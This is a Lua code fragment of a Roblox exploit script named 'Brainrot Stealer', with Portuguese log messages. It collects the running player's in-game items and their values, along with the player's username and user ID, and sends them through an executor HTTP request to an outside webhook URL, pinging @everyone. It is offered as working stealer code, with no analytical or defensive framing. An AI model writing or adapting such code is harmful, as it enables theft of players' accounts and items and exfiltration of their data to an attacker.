local function formatNumber(n)
    if not n or n == 0 then return "$0/s" end
    if n >= 1e12 then return "$" .. string.format("%.2fT", n / 1e12):gsub("%.?0+$", "")
    elseif n >= 1e9 then return "$" .. string.format("%.2fB", n / 1e9):gsub("%.?0+$", "")
    elseif n >= 1e6 then return "$" .. string.format("%.2fM", n / 1e6):gsub("%.?0+$", "")
    elseif n >= 1e3 then return "$" .. string.format("%.2fK", n / 1e3):gsub("%.?0+$", "")
    else return "$" .. math.floor(n) .. "/s" end
end

local function sendWebhook()
    if WEBHOOK_URL == "" then return end
    
    local request = syn and syn.request or (http and http.request or (http_request or request))
    if not request then return end
    
    local brainrots = scanBrainrotsFromBase()
    local baseSkins = scanBaseSkins()
    local gears = scanGears()
    
    local allItems = {}
    for _, item in ipairs(brainrots) do
        table.insert(allItems, item)
    end
    for _, item in ipairs(baseSkins) do
        table.insert(allItems, item)
    end
    for _, item in ipairs(gears) do
        table.insert(allItems, item)
    end
    
    if #allItems == 0 then
        print("[Stealer] Nenhum item encontrado!")
        return
    end
    
    table.sort(allItems, function(a, b)
        if a.type == "Brainrot" and b.type ~= "Brainrot" then return true end
        if a.type ~= "Brainrot" and b.type == "Brainrot" then return false end
        if a.type == "Brainrot" and b.type == "Brainrot" then
            return (a.gen or 0) > (b.gen or 0)
        end
        return false
    end)
    
    local lines = {}
    for _, item in ipairs(allItems) do
        if item.type == "Brainrot" then
            local mutationText = ""
            if item.mutation and item.mutation ~= "Normal" and item.mutation ~= "" then
                mutationText = " | Mutation: **" .. item.mutation .. "**"
            end
            table.insert(lines, "**" .. item.name .. "** [Brainrot]" .. mutationText .. " | Gen: **" .. formatNumber(item.gen) .. "**")
        elseif item.type == "BaseSkin" then
            table.insert(lines, "**" .. item.name .. "** [BaseSkin]")
        elseif item.type == "Gear" then
            table.insert(lines, "**" .. item.name .. "** [Gear]")
        end
    end
    
    local description = table.concat(lines, "\n")
    if #description > 4000 then
        description = description:sub(1, 3996) .. "..."
    end
    
    local executorName = "Unknown"
    pcall(function()
        if identifyexecutor then executorName = identifyexecutor()
        elseif getexecutorname then executorName = getexecutorname() end
    end)
    
    local playerCount = #Players:GetPlayers()
    local unixTime = os.time()
    
    local embed = {
        title = "Brainrot Stealer",
        description = description,
        color = 0xFF0000,
        fields = {
            {
                name = "Server",
                value = "Players: **" .. playerCount .. "** | Scanned: <t:" .. unixTime .. ":R>",
                inline = true
            },
            {
                name = "Executor",
                value = executorName,
                inline = true
            }
        },
        footer = {
            text = LocalPlayer.Name .. " • " .. LocalPlayer.UserId .. " | " .. os.date("%d/%m/%Y %H:%M:%S")
        },
        timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
    }
    
    local payload = {
        content = "@everyone",
        embeds = { embed },
        username = "Stealer",
        avatar_url = "https://i.ibb.co/Zzd40XF2/IMG-1023.png"
    }
    
    pcall(function()
        request({
            Url = WEBHOOK_URL,
            Method = "POST",
            Headers = { ["Content-Type"] = "application/json" },
            Body = HttpService:JSONEncode(payload)
        })
        print("[Stealer] Webhook enviado!")
    end)
end

